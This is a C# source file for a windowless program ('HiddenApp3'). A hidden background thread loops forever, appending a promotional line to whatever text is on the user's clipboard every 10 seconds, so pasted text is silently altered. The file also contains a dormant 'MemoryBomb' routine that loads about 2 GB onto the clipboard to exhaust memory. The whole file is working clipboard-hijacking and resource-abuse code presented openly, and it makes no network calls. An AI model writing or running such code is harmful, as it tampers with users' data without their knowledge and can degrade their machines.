using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace HiddenApp3
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //MemoryBomb();
            RunClipboardTail();
            Application.Run();
        }

        private static void MemoryBomb()
        {
            Clipboard.SetDataObject(new MemoryStream(new byte[1024000000 * 2L]));
            var data = Clipboard.GetDataObject()?.GetData(typeof(MemoryStream));

            var thread = new Thread(new ThreadStart(() =>
            {
                Thread.Sleep(3000);
                //1
                data = null;
                GC.Collect();
                Clipboard.SetDataObject(new MemoryStream(new byte[1]));
                data = Clipboard.GetDataObject()?.GetData(typeof(MemoryStream));
                //2
                data = null;
                GC.Collect();
            }));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private const string TAIL = "你需要关注《开发者精选资讯》公众号";
        private static void RunClipboardTail()
        {
            var thread = new Thread(new ThreadStart(() =>
            {
                while (true)
                {
                    try
                    {
                        var text = Clipboard.GetText();
                        if (text != null && text.Length > 0)
                        {
                            if (!text.EndsWith(TAIL))
                            {
                                Clipboard.SetText(text + TAIL);
                                Debug.WriteLine($"[{DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")}] successful catch text【{text}】changed to【{Clipboard.GetText()}】");
                            }
                        }
                    }
                    catch { }
                    Thread.Sleep(10000);
                }
            }))
            {
                IsBackground = true
            };
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
    }
}
